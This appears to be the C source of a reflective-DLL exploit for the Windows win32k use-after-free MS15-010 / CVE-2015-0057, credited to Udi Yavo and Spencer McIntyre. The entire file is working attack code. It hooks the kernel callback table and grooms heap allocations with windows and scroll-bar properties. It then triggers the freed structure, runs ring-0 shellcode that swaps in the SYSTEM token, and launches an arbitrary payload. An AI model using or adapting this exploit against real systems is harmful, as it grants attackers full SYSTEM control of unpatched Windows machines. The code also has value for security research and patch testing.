/*~
 * @brief MS15-010 / CVE-2015-0057 win32k!xxxEnableWndSBArrows Use After Free
 * @author Udi Yavo (Vulnerability discover and details)
 * @author Spencer McIntyre (Exploit)
 * @remark Details can be found at https://technet.microsoft.com/en-us/library/security/ms15-010.aspx
 *         and http://breakingmalware.com/vulnerabilities/one-bit-rule-bypassing-windows-10-protections-using-single-bit/
 */

#define REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR
#define REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN
#include "../../../ReflectiveDLLInjection/dll/src/ReflectiveLoader.c"

#define WIN32_NO_STATUS
#include <windows.h>
#undef WIN32_NO_STATUS
#include <WinUser.h>
#include <WinNT.h>
#include <stdlib.h>

#include "khelpers.h"

#ifdef DEBUGGING
// only needed because of the output printf stuff when debugging
#include <stdio.h>
#endif

#ifndef _NTDEF_
typedef __success(return >= 0) LONG NTSTATUS;
typedef NTSTATUS *PNTSTATUS;
#endif

#define MAX_ALLOCATION_ATTEMPTS 5000
#define DESTROY_WINDOW_IF_NOT_NULL(hWnd) \
	if (hWnd != NULL) { DestroyWindow(hWnd); hWnd = NULL; }

#define SIMULATED_ACTIVITY_HANDLE_COUNT 32
typedef struct _SIMULATED_ACTIVITY {
	HANDLE hRandWindows[SIMULATED_ACTIVITY_HANDLE_COUNT];
} SIMULATED_ACTIVITY, *PSIMULATED_ACTIVITY;

typedef NTSTATUS(NTAPI *lPsLookupProcessByProcessId)(
	IN   HANDLE ProcessId,
	OUT  PVOID Process
	);

typedef PACCESS_TOKEN(NTAPI *lPsReferencePrimaryToken)(
	_Inout_  PVOID Process
	);

typedef struct _LSA_UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR Buffer;
} LSA_UNICODE_STRING, *PLSA_UNICODE_STRING, UNICODE_STRING, *PUNICODE_STRING;

typedef struct _CLIENT_ID {
	PVOID UniqueProcess;
	PVOID UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef struct _TEB {
	ULONG BunchOfCrap[435];
	ULONG Win32ClientInfo[62];
} TEB, *PTEB;

typedef struct _PROCESS_BASIC_INFORMATION {
	PVOID Reserved1;
	PVOID PebBaseAddress;
	PVOID Reserved2[2];
	ULONG_PTR UniqueProcessId;
	PVOID Reserved3;
} PROCESS_BASIC_INFORMATION;

BOOL g_bFreeDatSbInfo = FALSE; /* flag to set for when the SBINFO should be freed */
BOOL g_bStealDatToken = FALSE; /* flag to set for when the token should be stolen */
HWND g_hWndTarget = NULL; /* this is the window that is attacked */
DWORD g_dwHookCtr = 0;
DWORD dwMyProcessId = 0;

#define BACKUP_SIZE 0x90
HANDLE g_bDataBackup[24];
PVOID g_pStructRestore = NULL;

lPsLookupProcessByProcessId pPsLookupProcessByProcessId = NULL;
lPsReferencePrimaryToken pPsReferencePrimaryToken = NULL;

PVOID get_kernel_callback_table() {
	PROCESS_BASIC_INFORMATION BasicInformation = { 0 };
	PVOID *pPeb = NULL;
	PVOID pKernelCallbackTable = NULL;
	ULONG ulReturnLength = 0;

	if (pNtQueryInformationProcess(GetCurrentProcess(), 0, &BasicInformation, sizeof(PROCESS_BASIC_INFORMATION), &ulReturnLength) == ERROR_SUCCESS) {
		pPeb = BasicInformation.PebBaseAddress;
		pKernelCallbackTable = pPeb[11];
		dprintf("[*] PEB address: 0x%p KernelCallbackTable 0x%p", pPeb, pKernelCallbackTable);
	}
	return pKernelCallbackTable;
}

void clear_simulate_activity(PSIMULATED_ACTIVITY sActivity) {
	DWORD dwHandleCursor;

	for (dwHandleCursor = 0; dwHandleCursor < SIMULATED_ACTIVITY_HANDLE_COUNT; dwHandleCursor++) {
		DESTROY_WINDOW_IF_NOT_NULL(sActivity->hRandWindows[dwHandleCursor]);
	}
	return;
}

void simulate_activity(PSIMULATED_ACTIVITY sActivity) {
	DWORD dwHandleCursor;

	for (dwHandleCursor = 0; dwHandleCursor < SIMULATED_ACTIVITY_HANDLE_COUNT; dwHandleCursor++) {
		if ((rand() % 2) == 1) {
			if (sActivity->hRandWindows[dwHandleCursor] == NULL) {
				sActivity->hRandWindows[dwHandleCursor] = CreateWindowEx(0, "Window 0", "Window 0", (WS_OVERLAPPED | WS_HSCROLL | WS_VSCROLL), CW_USEDEFAULT, CW_USEDEFAULT, 300, 150, NULL, NULL, NULL, NULL);
			} else {
				DestroyWindow(sActivity->hRandWindows[dwHandleCursor]);
				sActivity->hRandWindows[dwHandleCursor] = NULL;
			}
		}
	}
	return;
}

// Search the specified data structure for a member with CurrentValue.
BOOL find_and_replace_member(PDWORD_PTR pdwStructure, DWORD_PTR dwCurrentValue, DWORD_PTR dwNewValue, DWORD_PTR dwMaxSize)
{
	DWORD_PTR dwIndex, dwMask;

	// Microsoft QWORD aligns object pointers, then uses the lower three
	// bits for quick reference counting.
#ifdef _M_X64
	dwMask = ~0xf;
#else
	dwMask = ~7;
#endif
	// dwMask out the reference count.
	dwCurrentValue &= dwMask;

	// Scan the structure for any occurrence of dwCurrentValue.
	for (dwIndex = 0; dwIndex < dwMaxSize; dwIndex++)
	{
		if ((pdwStructure[dwIndex] & dwMask) == dwCurrentValue)
		{
			// And finally, replace it with NewValue.
			pdwStructure[dwIndex] = dwNewValue;
			return TRUE;
		}
	}

	// Member not found.
	return FALSE;
}

void __stdcall shellcode_ring0(void)
{
	void *pMyProcessInfo = NULL;
	void *pSystemInfo = NULL;
	PACCESS_TOKEN systemToken;
	PACCESS_TOKEN targetToken;

	pPsLookupProcessByProcessId((HANDLE)dwMyProcessId, &pMyProcessInfo);
	pPsLookupProcessByProcessId((HANDLE)4, &pSystemInfo);

	targetToken = pPsReferencePrimaryToken(pMyProcessInfo);
	systemToken = pPsReferencePrimaryToken(pSystemInfo);

	// Find the token in the target process, and replace with the system token.
	find_and_replace_member((PDWORD_PTR)pMyProcessInfo,
		(DWORD_PTR)targetToken,
		(DWORD_PTR)systemToken,
		0x200);
	return;
}

LRESULT CALLBACK wnd_proc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
	WORD um = 0;
	__asm {
		mov ax, cs
		mov um, ax
	}
	if (um == 0x1b) {
		return DefWindowProc(hWnd, msg, wParam, lParam);
	}
	if (g_bStealDatToken) {
		shellcode_ring0();
		g_bStealDatToken = FALSE;
		memcpy(g_pStructRestore, g_bDataBackup, BACKUP_SIZE);
	}
	return ~0x1337;
}

DWORD WINAPI execute_payload(LPVOID lpPayload)
{
	VOID(*lpCode)() = (VOID(*)())lpPayload;
	lpCode();
	return ERROR_SUCCESS;
}

DWORD WINAPI hook_client_load_library(LPVOID something) {
	HWND hWnd = g_hWndTarget;
	if ((!g_bFreeDatSbInfo) || g_dwHookCtr != 1) { /* checking that g_dwHookCtr == 1 verifies that the hook is executed at the correct time */
		if (g_bFreeDatSbInfo) {
			g_dwHookCtr++;
		}
		return 0;
	}
	dprintf("    [*] Inside client load library hWnd: 0x%p", hWnd);
	g_bFreeDatSbInfo = FALSE;

	SCROLLINFO si;
	ZeroMemory(&si, sizeof(SCROLLINFO));
	si.cbSize = sizeof(SCROLLINFO);
	si.fMask = (1 | SIF_PAGE);
	si.nPage = 1;

	/* has to be called twice to setup the flags for freeing */
	SetScrollInfo(hWnd, SB_HORZ, &si, FALSE);
	SetScrollInfo(hWnd, SB_VERT, &si, FALSE);

	/* this SetProp triggers the reallocation to (hopefully) replace the recently freed tagSBINFO */
	SetProp(hWnd, "TRIGGER", (PVOID)0xdead1337);
	return 0;
}

NTSTATUS __declspec(naked) __stdcall NtUserSetAppImeLevel(HWND hWnd, HANDLE hData) {
	__asm {
		mov     eax, 0x121a
		mov     edx, 0x7FFE0300
		call    [edx]
		retn    0x08
	}
}

PVOID swap_kernel_callback(PVOID table, DWORD pos, PVOID new_func) {
	PVOID old_func = NULL;
	DWORD dwBytesWritten;

	old_func = ((PVOID *)table)[pos];
	dprintf("[*] Original function pointer: 0x%p", old_func);
	dprintf("[*] New function pointer:      0x%p", new_func);
	if (WriteProcessMemory(GetCurrentProcess(), &((PVOID *)table)[pos], &new_func, PTR_SIZE, &dwBytesWritten)) {
		return old_func;
	}
	return NULL;
}

BOOL trigger_vuln(HWND hWnd, HWND hTemp, PVOID pSbInfoLocation)
{
	g_dwHookCtr = 0;
	g_bFreeDatSbInfo = TRUE;
	/* wArrows == ESB_DISABLE_BOTH NOT ESB_ENABLE_BOTH */
	if (EnableScrollBar(hWnd, SB_BOTH, ESB_DISABLE_BOTH) == 0) {
		dprintf("[!] EnableScrollBar failed %u", GetLastError());
	}
	g_bFreeDatSbInfo = FALSE;

	if ((((PPROPLIST)pSbInfoLocation)->iFirstFree != 3) || (((PPROPLIST)pSbInfoLocation)->aprop[0].hData != (PVOID)0xc0ffee01)) {
		dprintf("[!] PROPLIST allocated at wrong location");
		return FALSE;
	}

	SetProp(g_hWndTarget, "PWN 1", g_bDataBackup[8]);
	SetProp(g_hWndTarget, "PWN 2", g_bDataBackup[10]);
	SetProp(g_hWndTarget, "PWN 3", g_bDataBackup[12]);
	SetProp(g_hWndTarget, "PWN 4", g_bDataBackup[14]);
	SetProp(g_hWndTarget, "PWN 5", g_bDataBackup[16]);
	SetProp(g_hWndTarget, "PWN 6", g_bDataBackup[18]);
	SetProp(g_hWndTarget, "PWN 7", g_bDataBackup[20]);
	SetProp(g_hWndTarget, "PWN 8", g_bDataBackup[22]);
	NtUserSetAppImeLevel(g_hWndTarget, g_bDataBackup[24]); /* sets hWnd->bServerSideWindowProc = 1 */

	g_bStealDatToken = TRUE;
	if (SendMessage(hTemp, (WM_USER + 1), 0x1337, 0x1337) == ~0x1337) {
		dprintf("[+] SendMessage WM_USER + 1 succeeded");
	}
	else {
		dprintf("[!] SendMessage failed: %i, window might be corrupt", GetLastError());
		return FALSE;
	}
	return !g_bStealDatToken;
}

void win32k_use_after_free(LPVOID lpPayload)
{
	WNDCLASSA wndClass;
	char szNtName[256];
	PVOID pNtBase;
	OSVERSIONINFOA versionInfo;

	// Getting Windows version
	memset(&versionInfo, 0, sizeof(OSVERSIONINFOA));
	versionInfo.dwOSVersionInfoSize = 148;

	if (!GetVersionExA(&versionInfo))
	{
		dprintf("[!] Failed to get windows version");
		return;
	}

	/* collapse this code */
	if (TRUE) {
		// Solve symbols
		HMODULE hNtdll = LoadLibraryA("ntdll");
		if (hNtdll == NULL)
		{
			dprintf("[!] Failed to Load ntdll...");
			return;
		}

		if (!init_kernel_help()) {
			return;
		}

		ULONG ulSystemInfoBufferSize = 0;
		pNtQuerySystemInformation(11, &ulSystemInfoBufferSize, 0, &ulSystemInfoBufferSize);
		if (ulSystemInfoBufferSize == 0)
		{
			dprintf("[!] Requesting pZwQuerySystemInformation required length failed");
			return;
		}

		PULONG pSystemInfoBuffer = (PULONG)LocalAlloc(LMEM_ZEROINIT, ulSystemInfoBufferSize);
		if (pSystemInfoBuffer == NULL)
		{
			dprintf("[!] Allocation for SystemInfo failed");
			return;
		}

		if (pNtQuerySystemInformation(11, pSystemInfoBuffer, ulSystemInfoBufferSize, &ulSystemInfoBufferSize) != STATUS_SUCCESS)
		{
			dprintf("[!] Requesting kernel modules through ZwQuerySystemInformation failed");
			return;
		}

		SYSTEM_MODULE_INFORMATION *smi = (SYSTEM_MODULE_INFORMATION *)pSystemInfoBuffer;
		dprintf("[*] %d Kernel modules found", smi->ModulesCount);

		memset(szNtName, 0, 256);

		ULONG i = 0;
		while (i < smi->ModulesCount)
		{
			SYSTEM_MODULE *sm = (SYSTEM_MODULE *)(smi->Modules + i);
			dprintf("[*] Checking module %s", sm->Name);
			if (strstr((char *)sm->Name, ".exe"))
			{
				char *start = strstr((char *)sm->Name, "nt");
				if (start != NULL)
				{
					pNtBase = sm->ImageBaseAddress;
					strncpy_s(szNtName, 256, start, _TRUNCATE);
					break;
				}
			}
			i++;
		}

		if (szNtName == NULL)
		{
			dprintf("[!] nt not found");
			return;
		}
		dprintf("[*] Good! nt found as %s at 0x%08x", szNtName, pNtBase);

		HMODULE hNtKrnl = LoadLibraryA(szNtName);
		dprintf("[*] %s loaded in userspace at: %08x", szNtName, hNtKrnl);

		pPsLookupProcessByProcessId = (lPsLookupProcessByProcessId)GetProcAddress(hNtKrnl, "PsLookupProcessByProcessId");
		if (pPsLookupProcessByProcessId == NULL)
		{
			dprintf("[!] Failed to solve PsLookupProcessByProcessId");
			return;
		}

		pPsLookupProcessByProcessId = (lPsLookupProcessByProcessId)((DWORD_PTR)pNtBase + ((DWORD_PTR)pPsLookupProcessByProcessId - (DWORD_PTR)hNtKrnl));
		dprintf("[*] pPsLookupProcessByProcessId in kernel: 0x%p", pPsLookupProcessByProcessId);

		pPsReferencePrimaryToken = (lPsReferencePrimaryToken)GetProcAddress(hNtKrnl, "PsReferencePrimaryToken");
		if (pPsReferencePrimaryToken == NULL)
		{
			dprintf("[!] Failed to solve PsLookupProcessByProcessId");
			return;
		}

		pPsReferencePrimaryToken = (lPsReferencePrimaryToken)((DWORD_PTR)pNtBase + ((DWORD_PTR)pPsReferencePrimaryToken - (DWORD_PTR)hNtKrnl));
		dprintf("[*] pPsReferencePrimaryToken in kernel: 0x%p", pPsReferencePrimaryToken);
	}

	dwMyProcessId = GetCurrentProcessId();

	// Register Class
	memset(&wndClass, 0, sizeof(WNDCLASSA));
	wndClass.lpfnWndProc = wnd_proc; // Called with CallWindowProc => http://msdn.microsoft.com/en-us/library/windows/desktop/ms633571(v=vs.85).aspx
	wndClass.lpszClassName = "Window 0";

	if (!RegisterClassA(&wndClass)) {
		dprintf("[!] RegisterClassA Window0 failed ");
		return;
	}

	LPVOID kernel_callback_table = get_kernel_callback_table();
	if (!kernel_callback_table) {
		dprintf("[!] Failed to get the address of the kernel callback table");
		return;
	}

	swap_kernel_callback(kernel_callback_table, 65, hook_client_load_library); /* 65 is correct for Windows 7 SP1 x86 */

	HANDLE hWndGarbage = NULL;  /* garbage window for alignment */
	HANDLE hWndAdjacent = NULL; /* window who is allcoated after g_hWndTarget->SBINFO and is corrupted */
	DWORD dwAllocAttempts = MAX_ALLOCATION_ATTEMPTS;
	DWORD dwHandleCursor = 0;
	SIMULATED_ACTIVITY sActivity;
	memset(&sActivity, 0, sizeof(SIMULATED_ACTIVITY));

	PVOID pKrnTarget = NULL;
	PVOID pUsrTarget = NULL;

	do { /* the allocation shuffle! */
		DESTROY_WINDOW_IF_NOT_NULL(hWndGarbage);
		hWndGarbage = CreateWindowEx(0, "Window 0", "Window 0", (WS_OVERLAPPED | WS_HSCROLL | WS_VSCROLL), CW_USEDEFAULT, CW_USEDEFAULT, 300, 150, NULL, NULL, NULL, NULL);
		if (hWndGarbage == NULL) {
			dprintf("[!] Failed to allocate garbage window");
		}

		DESTROY_WINDOW_IF_NOT_NULL(g_hWndTarget);
		DESTROY_WINDOW_IF_NOT_NULL(hWndAdjacent);

		g_hWndTarget = CreateWindowEx(0, "Window 0", "Window 0", (WS_OVERLAPPED | WS_HSCROLL | WS_VSCROLL), CW_USEDEFAULT, CW_USEDEFAULT, 300, 150, NULL, NULL, NULL, NULL);
		if (g_hWndTarget == NULL) {
			dprintf("[!] g_hWndTarget is NULL");
			break;
		}
		pKrnTarget = get_kernel_address(g_hWndTarget);
		pUsrTarget = get_userland_address(g_hWndTarget, TRUE);
		dprintf("hWndTarget          = 0x%p / 0x%p", pKrnTarget, pUsrTarget);

		g_pStructRestore = (PVOID)(((PULONG)pUsrTarget)[28]);
		dprintf("hWndTarget->pSBInfo = 0x%p", g_pStructRestore);

		for (dwHandleCursor = 0; dwHandleCursor < SIMULATED_ACTIVITY_HANDLE_COUNT; dwHandleCursor++) {
			hWndAdjacent = sActivity.hRandWindows[dwHandleCursor];
			if (hWndAdjacent == NULL) {
				continue;
			}
			pKrnTarget = get_kernel_address(hWndAdjacent);
			if (((ULONG)pKrnTarget - (ULONG)g_pStructRestore) == 0x50) {
				dprintf("hWndAdjacent        = 0x%p", pKrnTarget);
				sActivity.hRandWindows[dwHandleCursor] = NULL;
				break;
			}
			hWndAdjacent = NULL;
		}
		if (hWndAdjacent != NULL) {
			break;
		}

		simulate_activity(&sActivity);
		dwAllocAttempts--;
	} while ((((ULONG)pKrnTarget - (ULONG)g_pStructRestore) != 0x50) && (dwAllocAttempts > 0));

	if ((g_hWndTarget != NULL) &&
		(hWndAdjacent != NULL))
	{
		SetProp(g_hWndTarget, "FOOBAR 1", (PVOID)0xc0ffee01);
		SetProp(g_hWndTarget, "FOOBAR 2", (PVOID)0xc0ffee02);
		ShowWindow(g_hWndTarget, SW_SHOW);
		UpdateWindow(g_hWndTarget);

		/* get the client delta out of the TEB (offset is for Windows 7 SP1 x86) */
		ULONG ulDelta = ((PULONG)pNtCurrentTeb())[442];
		memcpy(g_bDataBackup, (PVOID)((ULONG)g_pStructRestore - ulDelta), BACKUP_SIZE);
		dprintf("[*] Backed up the data from 0x%p to 0x%p", (PVOID)((ULONG)g_pStructRestore - ulDelta), g_bDataBackup);

		if (trigger_vuln(g_hWndTarget, hWndAdjacent, (PVOID)((ULONG)g_pStructRestore - ulDelta))) {
			CreateThread(0, 0, execute_payload, lpPayload, 0, NULL);
		}
	} else {
		dprintf("[!] Allocations are incorrect");
	}

	clear_simulate_activity(&sActivity);
	DESTROY_WINDOW_IF_NOT_NULL(g_hWndTarget);
	DESTROY_WINDOW_IF_NOT_NULL(hWndAdjacent);
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
{
	BOOL bReturnValue = TRUE;
	switch (dwReason)
	{
	case DLL_QUERY_HMODULE:
		hAppInstance = hinstDLL;
		if (lpReserved != NULL)
		{
			*(HMODULE *)lpReserved = hAppInstance;
		}
		break;
	case DLL_PROCESS_ATTACH:
		hAppInstance = hinstDLL;
		win32k_use_after_free(lpReserved);
		break;
	case DLL_PROCESS_DETACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
		break;
	}
	return bReturnValue;
}
